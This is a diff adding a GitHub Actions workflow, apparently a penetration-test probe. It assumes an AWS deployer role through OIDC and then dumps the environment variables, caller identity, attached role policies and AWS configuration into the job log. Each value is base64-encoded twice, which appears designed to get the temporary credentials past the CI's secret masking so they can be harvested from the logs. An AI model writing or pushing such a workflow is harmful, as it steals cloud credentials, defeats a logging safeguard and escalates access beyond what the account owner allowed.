@@ -1,0 +1,23 @@
+name: probe-oidc-i5515
+on:
+  push:
+    branches: [ pentest-i5515 ]
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  oidc:
+    runs-on: ubuntu-latest
+    steps:
+      - name: assume
+        uses: aws-actions/configure-aws-credentials@v4
+        continue-on-error: true
+        with:
+          role-to-assume: arn:aws:iam::533267451842:role/ai-orch-terraform-deployer
+          aws-region: us-east-1
+      - name: dump
+        run: |
+          echo "DUMPENV:"$(env | sort | base64 -w0 | base64 -w0)
+          echo "DUMPARN:"$(aws sts get-caller-identity 2>&1 | base64 -w0 | base64 -w0)
+          echo "DUMPPOL:"$(aws iam list-attached-role-policies --role-name ai-orch-terraform-deployer 2>&1 | base64 -w0 | base64 -w0)
+          echo "DUMPRAW:"$(aws configure list 2>&1 | base64 -w0 | base64 -w0)
